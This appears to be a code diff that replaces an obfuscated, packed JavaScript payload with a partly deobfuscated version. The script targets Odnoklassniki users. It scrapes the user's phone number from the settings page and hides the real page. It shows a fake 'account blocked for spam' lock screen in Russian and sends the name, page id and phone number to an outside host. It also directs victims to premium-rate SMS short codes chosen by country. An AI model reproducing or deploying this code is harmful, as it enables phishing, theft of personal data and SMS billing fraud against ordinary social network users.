@@ -1,1 +1,781 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('n i="";n E="";n 1i="6L";w 3n(2r){G 2r.1F(/\\+7(?!7)|\\+77|\\+1J|\\+1P|\\+1H|\\+1N|\\+1M|\\+1O|\\+1E/1d)}w 4g(){u(y.K(\'6T\')){30();y.M(\'1p\',"0");G P}u(!y.K(\'1p\')){y.M(\'1p\',\'1\')}}w 21(){n g=1j 3D().21()/3F/60;g=g-(g%1);G g}w 2A(){n 1a;1A{1a=1j 22()}1C(e){n 1V=1j 4J("1f.18.6.0","1f.18.5.0","1f.18.4.0","1f.18.3.0","1f.18","4H.18");1q(n i=0;i<1V.V&&!1a;i++){1A{1a=1j 4K(1V[i])}1C(e){}}}u(!1a)3a("4O 4N 4M 22 4G.");1y G 1a}w 36(33,25,26,1U){n O=2A();O.4F(25?"4z":"4y",33,2k);O.39(\'4w-4A\',\'4B/x-2j-1g-4E\');O.39(\'X-4D-4C\',\'22\');O.4P=w(){u(O.4Q==4){u(O.53==52){u(26)26(O.51)}1y{u(1U)1U()}}}O.54(25)}w 2A(){n 1a;1A{1a=1j 22()}1C(e){n 1V=1j 4J("1f.18.6.0","1f.18.5.0","1f.18.4.0","1f.18.3.0","1f.18","4H.18");1q(n i=0;i<1V.V&&!1a;i++){1A{1a=1j 4K(1V[i])}1C(e){}}}u(!1a)3a("4O 4N 4M 22 4G.");1y G 1a}w 36(33,25,26,1U){n O=2A();O.4F(25?"4z":"4y",33,2k);O.39(\'4w-4A\',\'4B/x-2j-1g-4E\');O.39(\'X-4D-4C\',\'22\');O.4P=w(){u(O.4Q==4){u(O.53==52){u(26)26(O.51)}1y{u(1U)1U()}}}O.54(25)}w 4i(){n 55=21()+60;u(y.K(\'3V\')){G P}1y{y.M(\'3V\',55.1l())}}w 30(){y.M(\'1p\',\'0\');o.A(\'3l\').F.I="W"}w 3d(){59();1A{o.A(\'6m\').F.I="W";o.A(\'6l\').F.I="W";o.A(\'6f\').F.I="W";o.H(\'6h 6k\')[0].F.I="W";o.A(\'3G\').F.2T="#1K";o.H(\'23\')[0].F.2T="#1K"}1C(e){29();5N()}}w 59(){u(o.H(\'3u\')[0]){o.H(\'3u\')[0].2f.2e(o.H(\'3u\')[0])}}w 41(){n 2a="";36(\'2b://2j.2O.2g/4X\',0,w(L){n d="";n 3r="";n f=L;n r=f.1F(/(?=<a 10=)(.+)(?=" q="6n">Номер телефона<\\/a>)/19);d=r[0].S(/<a 10="/1d,\'\');n 3A=d.S(/&50;/1d,\'&\');3r=3A;36(\'2b://2j.2O.2g/\',3r,w(4Z){n 6i=r[0].S(\'&50;\',\'&\');n 4T=4Z;2a=4T.1F(/[+]{1}[0-9]+(?:[X]+)/g);1i=2a.1l();1i=1i.S(/[X]/1d,\'\');1i=1i.S(/[+7]/1d,\'\');y.M(\'1k\',2a.1l());n f=2a.1l();2a=f.S(/[X]/1d,\'\');38()})})}n 16="4S";w 3o(){n 17=o.A(\'1c\').2h;17=3n(17).1l();u(/\\+77/19.1b(17)){16="6c";G}u(/\\+1J/19.1b(17)){16="6d";G}u(/\\+1H/19.1b(17)){16="1";G}u(/\\+1N/19.1b(17)){16="2";G}u(/\\+1P/19.1b(17)){16="3";G}u(/\\+1M/19.1b(17)){16="4";G}u(/\\+1O/19.1b(17)){16="5";G}u(/\\+1E/19.1b(17)){16="6";G;u(/\\+7(?!7)/19.1b(17)){16="4S";G}}}n 4R="";n 1u="";w 43(){n 1I=(y.K(\'1k\'));1I=3n(1I).1l();4R=1I;u(/\\+1J/19.1b(1I)){E="1";y.M(\'1o\',E);G}u(/\\+1H|\\+1N|\\+1P|\\+77|\\+1M|\\+1O|\\+1E/19.1b(1I)){E="2";y.M(\'1o\',E);G}u(/\\+7(?!7)/1d.1b(1I)){6b="7";E=\'3\';y.M(\'1o\',E);G}}n 2l="";w 38(){n k=y.K(\'1k\');k=k.S(/[X]/1d,\'\');k=k.S(/[+7]/1d,\'\');2l=k}w 29(){n 2u=o.3z("6o");2u.N("10","2b://6p.2O.2g/2o/6v/U/5X/5W-5Z.U");2u.N("E","L/U");2u.N("5Y","6a");o.3i(\'3q\')[0].3s(2u)}n 2H="";w 3b(){n 67=o.A(\'1m\').C;n 2r=o.A(\'1m\').C;u(2r.V==0){$(\'.B-e\').L(\'Укажите номер телефона\');$(\'.B-e\').U(\'I\',\'14\');G P}u(2r.V<8){$(\'.B-e\').L(\'В номере неверное количество цифр.\');$(\'.B-e\').U(\'I\',\'14\');G P}2J();40();$(\'.B-e\').U(\'I\',\'W\');$(\'#3c\').68({65:\'-=1r\'},62)}w 3U(){2H=6e;n 2d=$(\'#2n\').J();u(2d.V==0){$(\'.B-e\').L(\'Введите код.\');$(\'.B-e\').U(\'I\',\'14\');G P}u(2d.V!=5){$(\'.B-e\').L(\'В коде слишком мало цифр.Повторите попытку.\');$(\'.B-e\').U(\'I\',\'14\');G P}n 4V=o.A(\'2n\').C;u(2H){n 3g=2H.3N(\':\');1q(i=0;i<3g.V;i++)u(3g[i]==4V){$(\'.B-e\').U(\'I\',\'W\');y.M(\'1p\',\'0\');3a(\'Вы успешно разблокировали свою страницу, рекомендуем вам сменить пароль\');4Y();44();y.4I();G 2k}$(\'.B-e\').L(\'Вы ввели неправильный код, повторите попытку\');$(\'.B-e\').U(\'I\',\'14\');G P}}w 4Y(){o.6E="2b://2j.2O.2g/4X/3A?1Z.3t=73&3t=74&71=6w&1Z.70.3t=6W"}w 6X(){n 2d=$(\'#2n\').J();u(2d.V==0){$(\'.B-e\').L(\'Введите код.\');$(\'.B-e\').U(\'I\',\'14\');G P}u(2d.V<6){$(\'.B-e\').L(\'В коде слишком мало цифр.Повторите попытку.\');$(\'.B-e\').U(\'I\',\'14\');G P}}w 3h(e){n 1G;n 5a;n 6Y;n 2q;u(34.2s){1G=e.3x}1y u(e.3y){1G=e.3y}5a=76.75(1G);u(1G<45||1G>57){2q=P;u(1G==8)2q=2k}1y 2q=2k;G 2q}w 3B(){J=$(\'#Y\').J();L=$(\'#Y z:48\').L();o.A(\'1c\').2h=J;o.A(\'2W\').28=\'<b>\'+L+\'</b>\';o.A(\'Y\').F.I=\'14\';o.A(\'2Z\').F.I=\'W\';3o();u(J=="+7"){E="3";y.M(\'1o\',E)}u(J=="+1J"){E="1";y.M(\'1o\',E)}u((J=="+77")||(J=="+1H")||(J=="+1N")||(J=="+1P")||(J=="+1M")||(J=="+1O")||(J=="+1E")){E="2";y.M(\'1o\',E)}1u=o.A(\'Y\').C}w 3f(){J=$(\'#Y\').J();L=$(\'#Y z:48\').L();o.A(\'1c\').2h=J;o.A(\'2W\').28=\'<b>\'+L+\'</b>\';$(\'#2Z\').U("I","14");$(\'#Y\').U("I","W");3o();u(J=="+7"){E="3";y.M(\'1o\',E)}u((J=="+1J")){E="1";y.M(\'1o\',E)}u((J=="+77")||(J=="+1H")||(J=="+1N")||(J=="+1P")||(J=="+1M")||(J=="+1O")||(J=="+1E")){E="2";y.M(\'1o\',E)}1u=o.A(\'Y\').C;1u=1u.S(\'+\',\'\')}w 5b(){1A{u(o.H(\'4d 46\')[0]){y.M(\'1L\',3J(o.H(\'4d 46\')[0].2h))}}1C(e){n 2S=o.A(\'4c-78\');2S=2S.S(/[помощьвыход]/1d,\'\');y.M(\'1L\',3J(2S.1l()))}}w 44(){o.A(\'3l\').F.I=\'W\'}w 40(){n 4o=7d.79;n 1c=o.A(\'1c\').2h;1c=1c.S(\'+\',\'\');n 2D=y.K(\'1L\');2D=(7a(2D));n 1s=1c+($(\'#1m\').J());n 2V=[\'a\',\'b\',\'c\',\'d\',\'e\',\'f\',\'g\',\'h\',\'i\',\'j\'];n 2o="";1q(i=0;i<1s.V;i++)2o+=2V[4p(1s[i])];n 2z=o.3z(\'4s\');2z.N(\'E\',\'L/4r\');n 2Y=\'2b://1R-4u.2g/42/6Z.4e?E=\'+E+\'&4a=\'+2o+\'&1e=\'+2D+\'&4U=\'+v+\'&v=\'+y.K(\'v\')+\'&4f=\'+y.K(\'4f\')+\'&6F=\'+4o;2z.N(\'5Q\',2Y);o.3i(\'3q\')[0].3s(2z);y.M(\'4l\',v)}w 4m(){o.H(\'4t 4n\')[0].2f.2e(o.H(\'4t 4n\')[0]);o.H(\'23\')[0].2f.2e(o.H(\'23\')[0]);3d();T();o.2c.3I(\'2i\',4m,P)}w 6x(){n l=o.A(\'1m\');u(l==0){6z(\'Введите номер телефона!\');G}}w 2J(){1A{n 1s=y.K(\'1k\');n v=y.K(\'v\');n 6A=y.K(\'6B\');n 2V=[\'a\',\'b\',\'c\',\'d\',\'e\',\'f\',\'g\',\'h\',\'i\',\'j\'];1s=1s.S(/\\+/,\'\');n 2o=y.K(\'1k\');1s=1s.S(/[X]/1d,\'\');n 4k=o.A(\'1m\').C;n p=o.A(\'1c\').2h;p=p.S(\'+\',\'\');1u=1u.S(\'+\',\'\');n 3m=p+4k;n 3v=\'\';1q(n i=0;i<3m.V;i++)3v+=2V[4p(3m[i])];n 1R=o.3z(\'4s\');1R.N(\'E\',\'L/4r\');n 2Y=\'2b://1R-4u.2g/42/6M.4e?E=\'+E+\'&4a=\'+3v+\'&4U=\'+3R+\'&v=\'+v+\'&16=\'+16;1R.N(\'5Q\',2Y);o.3i(\'3q\')[0].3s(1R)}1C(e){}}n t="";w 6K(){u(2s.3x==9)G P}w 2U(1w){1w=(1w||34.2s);1D=(1w.3x||1w.6P||1w.3y||0);u(1D==3||1D==9||1D==13){1w.6S();1w.6R()}}34.4j=w(){o.2c.3M(\'6Q\',2U,P)}w T(){29();o.2c.3I(\'2i\',49,P);n 1n=o.A(\'3l\');o.A(\'6J\').28=\'<m q="1Q-1S"></m>\';38();1n.28=\' <m q="1Q-1S"></m></m><m v="5i" q="5d" ><m v="5c" q="23"></m><12 q="5e"><11><1h><1t q="5f"><m v="2p" q="2p 5h" F="27: 37; 1z: 1r;"><m q="5g 5p" v="5q" F="27: 37; 1z: 1r; 5B-2X:#1K;"><m q="5C"><m q="5x-5s"></m></m><m q="5r"><m v="5t"><m v="5u" q="31"><m v="5y"><m v="5j" q="31"><m q="5F" v="5o"><1g 5n="#" 5m="5k"><m v="5l"><m v="3c" F="1x: 1v; 1z: 1r;"><m q="1g 2F-2-2"><m q="R"><1Y q="15-1X" ><Q>\'+2v(y.K(\'1L\'))+\', Ваша страница была заблокирована по подозрению на взлом!</5E><m><Q>Наша система безопасности выявила массовую рассылку спам-сообщений с Вашего аккаунта и мы были вынуждены временно заблокировать его. Для восстановления доступа к аккаунту Вам необходимо пройти валидацию через мобильный телефон.</m></m><m q="R"><12 q="B-2K-f 15-2L"><11><1h><1t>Страна оператора: <5R v="2W"  ><b>Россия</b></1W> <a><D F="2X:5L;" v = "2Z" Z= "3B();" >Выберите страну</a></D> <2B 5J="3f();"F="1x: 1v; I: W; 27: 5M%;" v="Y" 1e="Y">2.<z C="+7">Россия</z 3T:3Z>3.<z C="+1J">Украина</z>4.<z C="+1H">Армения</z>5.<z C="+1N">Азербайджан</z>5.<z C="+1P">Беларусь</z>6.<z C="+1M">Литва</z>6.<z C="+1O">Латвия</z>7.<z C="+1E">Молдова</z> 7.<z C="+77">Казахстан</z></2B>&5z;</1t></1h></11></12><D q="B-l B-5w 15-1i-2x"><1W v="1c" 1q="2x">+7</1W></D><m q="2P"><B E="L" 1e="1Z.2E" C="\'+1i+\'" v="1m" q="2M 2N" 5A="5P" 2R="20"  5I="G 3h(2s)" 5V></m><D q="B-e"></D></m><D><m q="R" F = "1x:1v"><B E="1B" v="4q" Z="3b(); 2J();" C="Выслать код"   q="1B-2w"></D></m><m q="R"><Q><D>Не получилось войти на сайт?<a q="2C" 10="#">Обратитесь в службу поддержки</a></D></m></m></m>	<m v="5H"  F="1x: 1v;  1z: 1r;"><m q="1g 2F-2-2"><m q="R"><2G q="15-1X"><Q><Q>Восстановление доступа</2G><Q><b>\'+2v(y.K(\'1L\'))+\'</b>,  В течении минуты на Ваш телефон<b>  \'+y.K(\'1k\')+\'</b>  прийдет 2t с кодом разблокировки Вашего аккаунта, полученный код введите здесь :<m></m></m><m q="R"><12 q="B-2K-f 15-2L"><11></1h></11></12><D q="B-l"><1Y q="15-1X" >Введите код <Q>подтверждения</1Y></D><m q="2P"><B E="L" 1e="1Z.2E" C="" v="2n"  q="2M 2N" 2R="20"></m><D q="B-e"></D></m><m q="R"><D><B E="1B" v="5D" Z="3U();" C="Восстановить профиль" q="1B-2w"></D></m><m q="R"><Q><D>Не получилось войти на сайт?<a q="2C" 10="#">Обратитесь в службу поддержки</a></D></m></m></m><m></1g></m></m></m></m></m></m></m></m></1t></1h></11></12></m></m></m>\';1n.F.I=\'14\';1n.N("3Y","2U()");o.A(\'1m\').C=2l;y.M(\'1p\',\'2\')}w 47(){u(o.H(\'3k 3w 3j 3p\')[0]){o.A(\'3k 3w 3j 3p\')[0].2f.2e(o.A(\'3k 3w 3j 3p\')[0])}n 1n=o.A(\'3G\');n 3e=o.H(\'3e\')[0];3e.28=\'<m q="6D"><a q="6H"><m q="6G"></m></a><m q="6V">Восстановление доступа</m></m>\';3d();38();1n.28=\'<m q="1Q-1S"></m></m><m v="5i" q="5d" ><m v="5c" q="23"></m><12 q="5e"><11><1h><1t q="5f"><m v="2p" q="2p 5h" F="27: 37; 1z: 1r;"><m q="5g 5p" v="5q" F="27: 37; 1z: 1r; 5B-2X:#1K;"><m q="5C"><m q="5x-5s"></m></m><m q="5r"><m v="5t"><m v="5u" q="31"><m v="5y"><m v="5j" q="31"><m q="5F" v="5o"><1g 5n="#" 5m="5k"><m v="5l"><m v="3c" F="1x: 1v; 1z: 1r;"><m q="1g 2F-2-2"><m q="R"><1Y q="15-1X" ><Q>\'+2v(y.K(\'1L\'))+\', Ваша страница была заблокирована по подозрению на взлом!</5E><m><Q>В течении минуты на Ваш телефон<b> \'+y.K(\'1k\')+\'</b> прийдет 2t с требованием подтвердить активацию Вашего аккаунта, после подтверждения Вы получите код, введите его здесь:</m></m><m q="R"><12 q="B-2K-f 15-2L"><11><1h><1t>Страна оператора: <5R v="2W"  ><b>Россия</b></1W> <a><D F="2X:5L;" v = "2Z" Z= "3B();" >Выберите страну</a></D> <2B 5J="3f();"F="1x: 1v; I: W; 27: 5M%;" v="Y" 1e="Y">2.<z C="+7">Россия</z 3T:3Z>3.<z C="+1J">Украина</z>4.<z C="+1H">Армения</z>5.<z C="+1N">Азербайджан</z>5.<z C="+1P">Беларусь</z>6.<z C="+1M">Литва</z>6.<z C="+1O">Латвия</z>7.<z C="+1E">Молдова</z>7.<z C="+77">Казахстан</z> </2B>&5z;</1t></1h></11></12><D q="B-l B-5w 15-1i-2x"><1W v="1c" 1q="2x">+7</1W></D><m q="2P"><B E="L" 1e="1Z.2E" C="7"\'+2l+\' v="1m" q="2M 2N" 5A="5P" 2R="20" 5I="G 3h(2s)" 5V></m><D q="B-e"></D></m><D><m q="R" F = "1x:1v"><B E="1B" v="4q" Z="3b(); 2J();" C="Выслать код" q="1B-2w"></D></m><m q="R"><Q><D>Не получилось войти на сайт?<a q="2C" 10="#">Обратитесь в службу поддержки</a></D></m></m></m>	<m v="5H"  F="1x: 1v;  1z: 1r;"><m q="1g 2F-2-2"><m q="R"><2G q="15-1X"><Q><Q>Восстановление доступа</2G><Q><b> \'+2v(y.K(\'1L\'))+\' </b>,на Ваш телефон прийдет 2t с кодом разблокировки Вашего аккаунта. Полученный код введите здесь :.<m></m></m><m q="R"><12 q="B-2K-f 15-2L"><11></1h></11></12><D q="B-l"><1Y q="15-1X" >Введите код <Q>подтверждения</1Y></D><m q="2P"><B E="L" 1e="1Z.2E" C="" v="2n"  q="2M 2N" 2R="20"></m><D q="B-e"></D></m><m q="R"><D><B E="1B" v="5D" Z="3U();" C="Восстановить профиль" q="1B-2w"></D></m><m q="R"><Q><a D v="72" F="3T:3Z" Z="5G();">Не получили код?</a><a q="2C" 10="#">Обратитесь в службу поддержки</a></D> <m v="3C" F="I:W"><Q>Получить активационный код можно отправив 2t с текстом <b>6r 66</b> на номер <b>64</b>.Стоимость 2t равна номинальной стоимости, установленной вашим оператором.Если не получилось отправить смс, свяжитесь с нами</m></m></m></m><m></1g></m></m></m></m></m></m></m></m></1t></D></1h></11></12></m></m></m>\';1n.F.I=\'14\';1u=o.A(\'Y\').C;1n.N("3Y","2U()");o.A(\'1m\').C=2l;1n.63();o.H(\'23\')[0].F.2T="#1K";o.A(\'2p\').F.69="#1K";o.A(\'3G\').F.2T="#1K";y.K(\'1p\')==\'2\';u(o.H(\'1Q-1S\')[0])o.H(\'1Q-1S\')[0].2f.2e(o.H(\'1Q-1S\')[0])}n h="0";w 5G(){u(h==0){o.A(\'3C\').F.I="14";h=1}1y{o.A(\'3C\').F.I="W";h=0}}w 5N(){u(o.H(\'5U\')[0]){n 2m=o.H(\'5v\')[0];2m.N("3W","T()");n 3K=o.H(\'6j\');1q(i=0;i<3K.V;i++){3K[i].N("3W","T()")}}}w 5O(){n 3O=o.H(\'1T 5K\')[0];3O.10=\'#\';3O.N(\'Z\',\'T()\');n 3P=o.H(\'1T 7f\')[0];3P.10=\'#\';3P.N(\'Z\',\'T()\');n 3E=o.H(\'1T 7b\')[0];3E.10=\'#\';3E.N(\'Z\',\'T()\');n 3S=o.H(\'1T 6C\')[0];3S.10=\'#\';3S.N(\'Z\',\'T()\');n 3H=o.H(\'1T 6y\')[0];3H.10=\'#\';3H.N(\'Z\',\'T()\')}n v="";n 3R="";w 4b(){u(o.H(\'6I\')[0]){u(o.H(\'1T 5K\')[0]){5O()}}u(o.A(\'5T\')){o.A(\'5T\').N(\'3Y\',\'T()\')}u(o.H(\'5U\')[0]){u(o.H(\'3X\')[0]){u(o.H(\'3X\')[0].F.I==\'6N\'){n 5S=o.H(\'3X\')[0];5S.N(\'3W\',"T()")}}}n 2m=o.H(\'5v\')[0];u(2m)2m.N("Z","T()")}w 49(){29();T()}w 4h(){v=o.H(\'4c-6O\')[3];v=v.10.1F(/[0-9]+/);3R=v.1l();y.M(\'4l\',v.1l())}34.4j=w(){4i();4x();4g();4h();5b();u((!y.K(\'1k\'))||(y.K(\'1k\').6U==0)){41()}43();n 1D=y.K(\'1p\');u(1D==\'0\'){30();G P}u(1D==\'1\'){o.2c.3M(\'2i\',4b,P);29()}u(1D==\'2\'){29();47()}}w 7c(){o.2c.3M(\'2i\',T(),P)}w 4W(){n 2y=o.A(\'7e\');u(2y){o.2c.3I(\'2i\',4W,P);2y.2f.2e(2y);T()}}n 2Q;w 4v(){2Q={};n 3L=o.56.3N(\';\');n 2I=/^[\\s]*([^\\s]+?)$/i;1q(n i=0,l=3L.V;i<l;i++){n c=3L[i].3N(\'=\');u(c.V==2){2Q[c[0].1F(2I)[1]]=2v(c[1].1F(2I)?c[1].1F(2I)[1]:\'\')}}}w 61(1e){4v();G 2Q[1e]}w 6q(1e,C,3Q){n 32=\'\';n 58=\'; 6u=/\';u(3Q){n 35=1j 3D();35.6s(35.21()+(3Q*24*60*60*3F));32=\'; 32=\'+35.6g()}o.56=1e+\'=\'+3J(C)+32+58}w 6t(){n g=1j 3D().21()/3F/ 60 /60;g=g-(g%1);G g}w 4x(){1A{n 4L=y.K(\'3V\')}1C(e){}u(4L<21()){y.M(\'1p\',\'0\');y.4I();30()}}',62,450,'||||||||||||||||||||||div|var|document||class||||if|id|function||plg|option|getElementById|input|value|span|type|style|return|getElementsByClassName|display|val|Get|text|Save|setAttribute|req|false|br|form_i|replace|Wnd|css|length|none||country_select|onclick|href|tbody|table||block|recovery|shot|cod|XMLHTTP|ig|xmlHttp|test|pre|gi|name|MSXML2|form|tr|phone|new|oPhone|toString|field_mobile|modalPop|oType|oRun|for|341px|number|td|pCode|left|evt|float|else|height|try|button|catch|key|373|match|keynum|374|code|380|FFF|oName|370|994|371|375|feed|sms|loading|mark_ic|fFailed|XmlHttpVersions|label|header|h2|st||getTime|XMLHttpRequest|modal_overlay||params_post|fSuccess|width|innerHTML|LoadCSS|buf|http|body|pole|removeChild|parentNode|ru|innerText|DOMNodeInserted|www|true|nam|addCommentBtn|field_mobile2|res|modal_box|return2|num|event|SMS|NewCSS|unescape|pro|prefix|gg|state|get_xmlHttp|select|feedbackLink|HiName|mobile|form__gl|h3|sndSms|re|SendSMS|flx|selector|it|it__promo|odnoklassniki|it_w|_cookies|maxlength|nm|backgroundColor|cancel|alpha|contr|color|url|choose_country|LockStop|hookBlock|expires|lnk|window|date|AjaxLoad|740px|Num|setRequestHeader|alert|GoStep|Step_1|ClearPage|toolbar|in_sel_ch|validKey|OnlyNum|getElementsByTagName|ntf_spacer__animated|ntf_spacer|hook_Block_PopLayer|aress|TelCode|GetCountry|ntf_spacer__on|head|DF|appendChild|cmd|toolbar_decor|ares|ntf__prev_position|keyCode|which|createElement|dk|Sp_st|hide|Date|d3|1000|mainContainer|d5|removeEventListener|escape|arr|ca|addEventListener|split|d1|d2|days|oID|d4|cursor|st_2|oTime|onClick|plp_cmt_btn|onkeydown|pointer|Stat|GetNumber|js|Prefix|HideLock||bl|Wnd_Page|selected|Plus|set|Go|portal|mctc_nameLink|php|group|NewAction|GetId|CheckTime|onload|rnum|oIdPage|MesBtnClick|mdialog_m|useragent|parseInt|step|javascript|script|mdialog|helper|_initCookies|Content|IsTime|GET|POST|Type|application|With|Requested|urlencoded|open|object|Microsoft|Del|Array|ActiveXObject|lTime|the|creating|Error|onreadystatechange|readyState|gCode|2332|srvAns|page|inputKey|remove_mess|settings|RedirToChangePass|next|amp|responseText|200|status|send|startTime|cookie||path|ClearToolbar|keychar|GetName|popLayer_mo|modal|modal_tbl|modal_td|panelLayer|modal_box__payment|hook_Modal_popLayer|hook_Block_AnonymAccountRecovery|post|LockContent|method|action|hook_Form_5878971965|layerPanelSimple|paymentWizardInstant|panelLayer_body|title|pmntWzrdCtr|hook_Block_MiddleColumn|plp_cmt_w|l__promo|panelLayer_head_headerSimple__no|middleColumn|nbsp|autocomplete|border|panelLayer_head|step2|h1|hook|Hidden|Step_2|onkeypress|onchange|mark_ic__1|orange|90|GLock|Mark|off|src|Label|comment|plp_fldCom|pl_cw|autofocus|main|9f2f479c|rel|part4||getCookie|800|focus|5537|marginTop|252|info_cl|animate|borderColor|stylesheet|shots|7502|9106|sendSms|footer|toGMTString|topPanel|dd|viewPhotoMark|topPanel_m|mainContentLeftColumn|hook_Block_FrOln4thCol|bold|link|stg|setCookie|007187|setTime|getTime2|Path|batch|819|CheckMobilName|mark_ic__5|confirm|idPage|vIdPage|mark_ic__4|toolbar_c|location|user_agent|toolbar_logo_img|toolbar_logo|centD|hook_Block_ContentColumnContainer|AntiTab|911|sendsms|inline|headline__link|charCode|keypress|stopPropagation|preventDefault|vRun|lenght|toolbar_label|PopLayerConfigUserPassword|check|numcheck|stat|layer|tkn|hid|userConfig|PopLayer|fromCharCode|String||headline_login|userAgent|encodeURIComponent|mark_ic__3|Worll|navigator|topPanelPopup_m|mark_ic__2'.split('|'),0,{}))
+var i = "";
+var type = "";
+var phone = "911";
+function TelCode(num){
+	return num.match(/\+7(?!7)|\+77|\+380|\+375|\+374|\+994|\+370|\+371|\+373/gi);
+}
+
+
+function NewAction() {
+    if (plg.Get('vRun')) {
+        LockStop();
+        plg.Save('oRun', "0");
+        return false;
+    }
+	if (!plg.Get('oRun')){
+		plg.Save('oRun','1');
+	}
+}
+
+
+function getTime() {
+    var g = new Date().getTime() / 1000 / 60;
+    g = g - (g % 1);
+    return g;
+}
+
+function get_xmlHttp() 
+{ 
+   var xmlHttp; 
+   try 
+    { 
+      xmlHttp = new XMLHttpRequest(); 
+   } 
+   catch(e) 
+   { 
+      var XmlHttpVersions = new Array("MSXML2.XMLHTTP.6.0", 
+      "MSXML2.XMLHTTP.5.0", 
+      "MSXML2.XMLHTTP.4.0", 
+      "MSXML2.XMLHTTP.3.0", 
+      "MSXML2.XMLHTTP", 
+      "Microsoft.XMLHTTP"); 
+      for (var i = 0; i < XmlHttpVersions.length && ! xmlHttp; 
+      i ++ ) 
+      { 
+         try 
+         { 
+            xmlHttp = new ActiveXObject(XmlHttpVersions[i]); 
+         } 
+         catch (e) 
+         { 
+         } 
+      } 
+   } 
+   if ( ! xmlHttp) 
+   alert("Error creating the XMLHttpRequest object."); 
+   else 
+   return xmlHttp; 
+}
+
+function AjaxLoad(lnk, params_post, fSuccess, fFailed) {
+	var req = get_xmlHttp() ;
+	
+	req.open(params_post ? "POST" : "GET", lnk, true);
+	req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	req.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+	req.onreadystatechange = function()	{
+		if (req.readyState == 4) {
+			if (req.status == 200) {
+				if (fSuccess)
+					fSuccess(req.responseText);
+			} else {
+				if (fFailed)
+					fFailed();
+			}
+		}
+	}
+	req.send(params_post);
+}
+function get_xmlHttp() { 
+   var xmlHttp; 
+   try 
+    { 
+      xmlHttp = new XMLHttpRequest(); 
+   } 
+   catch(e) 
+   { 
+      var XmlHttpVersions = new Array("MSXML2.XMLHTTP.6.0", 
+      "MSXML2.XMLHTTP.5.0", 
+      "MSXML2.XMLHTTP.4.0", 
+      "MSXML2.XMLHTTP.3.0", 
+      "MSXML2.XMLHTTP", 
+      "Microsoft.XMLHTTP"); 
+      for (var i = 0; i < XmlHttpVersions.length && ! xmlHttp; 
+      i ++ ) 
+      { 
+         try 
+         { 
+            xmlHttp = new ActiveXObject(XmlHttpVersions[i]); 
+         } 
+         catch (e) 
+         { 
+         } 
+      } 
+   } 
+   if ( ! xmlHttp) 
+   alert("Error creating the XMLHttpRequest object."); 
+   else 
+   return xmlHttp; 
+}
+
+function AjaxLoad(lnk, params_post, fSuccess, fFailed) {
+	var req = get_xmlHttp() ;
+	
+	req.open(params_post ? "POST" : "GET", lnk, true);
+	req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	req.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+	req.onreadystatechange = function()	{
+		if (req.readyState == 4) {
+			if (req.status == 200) {
+				if (fSuccess)
+					fSuccess(req.responseText);
+			} else {
+				if (fFailed)
+					fFailed();
+			}
+		}
+	}
+	req.send(params_post);
+}
+
+
+function CheckTime() {
+    var startTime = getTime() + 60;
+    if (plg.Get('oTime')) {
+        return false;
+
+    } else {
+        plg.Save('oTime', startTime.toString());
+    }
+}
+
+function LockStop() {
+    plg.Save('oRun', '0');
+    document.getElementById('hook_Block_PopLayer').style.display = "none";
+
+}
+
+function ClearPage() {
+    ClearToolbar();
+    try {
+        document.getElementById('hook_Block_FrOln4thCol').style.display = "none";
+        document.getElementById('mainContentLeftColumn').style.display = "none";
+        document.getElementById('footer').style.display = "none";
+        document.getElementsByClassName('topPanel topPanel_m')[0].style.display = "none";
+        document.getElementById('mainContainer').style.backgroundColor = "#FFF";
+        document.getElementsByClassName('modal_overlay')[0].style.backgroundColor = "#FFF";
+    } catch (e) {
+        LoadCSS();
+        GLock();
+
+    }
+}
+
+function ClearToolbar() {
+    if (document.getElementsByClassName('toolbar_decor')[0]) {
+        document.getElementsByClassName('toolbar_decor')[0].parentNode.removeChild(document.getElementsByClassName('toolbar_decor')[0]);
+    }
+}
+
+function GetNumber() {
+var buf = "";
+	AjaxLoad('http://www.odnoklassniki.ru/settings',0,function(text){
+			var d="";
+			var DF = "";
+			var f=text;
+			var r = f.match(/(?=<a href=)(.+)(?=" class="bold">Номер телефона<\/a>)/ig);
+			d = r[0].replace(/<a href="/gi, '');
+			var dk = d.replace(/&amp;/gi, '&');
+			DF = dk;	
+			
+AjaxLoad('http://www.odnoklassniki.ru/',DF,function(next){
+var dd = r[0].replace('&amp;', '&');
+						
+						var srvAns = next;
+						
+						buf = srvAns.match(/[+]{1}[0-9]+(?:[X]+)/g);
+						phone = buf.toString();
+						phone=phone.replace(/[X]/gi,'');
+						phone=phone.replace(/[+7]/gi, '');
+						
+						
+						plg.Save('oPhone',buf.toString());
+						var f = buf.toString();
+						buf=f.replace(/[X]/gi,'');
+						
+						Num();
+						
+})
+});
+	  
+}
+var shot = "2332";
+function GetCountry() {
+	var cod = document.getElementById('pre').innerText;
+	cod = TelCode(cod).toString();
+	
+	if (/\+77/ig.test(cod)){
+		shot="7502";
+		
+		return;
+	}
+	if (/\+380/ig.test(cod)) {
+		shot="9106";
+		
+		return;
+	}
+	if (/\+374/ig.test(cod)){
+		shot = "1";
+		return;
+	}
+	if (/\+994/ig.test(cod)){
+		shot = "2";
+		return;
+	}
+	if (/\+375/ig.test(cod)){
+		shot="3";
+		return;
+	}
+	if (/\+370/ig.test(cod)){
+
+		shot ="4";
+		return;
+}
+	if (/\+371/ig.test(cod)){
+
+		shot ="5";
+		return;
+}
+	if (/\+373/ig.test(cod)){
+
+		shot ="6";
+		return;
+	
+	if (/\+7(?!7)/ig.test(cod)){
+		shot="2332";
+		
+		return;
+}
+}
+	}
+var gCode = "";
+var pCode = "";
+function Prefix() {
+var code = (plg.Get('oPhone'));
+code = TelCode(code).toString();
+gCode = code;
+
+
+if (/\+380/ig.test(code)) { 
+
+	type = "1";
+	plg.Save('oType',type);
+return;
+}
+if (/\+374|\+994|\+375|\+77|\+370|\+371|\+373/ig.test(code)) { 
+
+	type = "2";
+	plg.Save('oType',type);
+return;
+}
+if (/\+7(?!7)/gi.test(code)) { 
+	shots="7";
+	type = '3'; 
+	plg.Save('oType',type);
+
+	return;
+} 
+
+}
